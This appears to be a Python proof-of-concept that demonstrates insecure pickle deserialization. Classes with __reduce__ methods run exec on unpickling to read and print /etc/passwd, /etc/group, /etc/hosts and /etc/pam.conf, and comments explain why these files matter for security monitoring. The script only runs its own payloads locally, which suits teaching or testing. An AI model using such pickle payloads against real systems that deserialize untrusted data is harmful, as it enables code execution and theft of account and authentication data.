import _pickle as cPickle
import builtins

# Changes to /etc/passwd, /etc/shadow, /etc/group, /etc/gshadow are all super important to monitor
# because this is where user accounts, groups and password hashes are stored. Related to that are files
# under /etc/pam.d where password and lockout policies are stored and where
# sophisticated attackers can install bogus pluggable authentication modules that steal passwords
class passwd(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))
class group(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/group','r') as r: print(r.readlines())",))

# Attackers can override DNS and cause your system to communicate with imposter systems by messing with files like /etc/hosts and /etc/resolv.conf.
class hosts(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/hosts','r') as r: print(r.readlines())",))
# The PAM configuration file, /etc/pam. conf , determines the authentication services to be used, and the order in which the services are used.
# This file can be edited to select authentication mechanisms for each system entry application.
class pam(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/pam.conf','r') as r: print(r.readlines())",))

print("\n--------------------passwoeds--------------------")
password = cPickle.dumps(passwd())
cPickle.loads(password)

print("\n--------------------groups--------------------")
groups = cPickle.dumps(group())
cPickle.loads(groups)

print("\n--------------------hosts--------------------")
host = cPickle.dumps(hosts())
cPickle.loads(host)

print("\n--------------------pam--------------------")
pamConf = cPickle.dumps(pam())
cPickle.loads(pamConf)

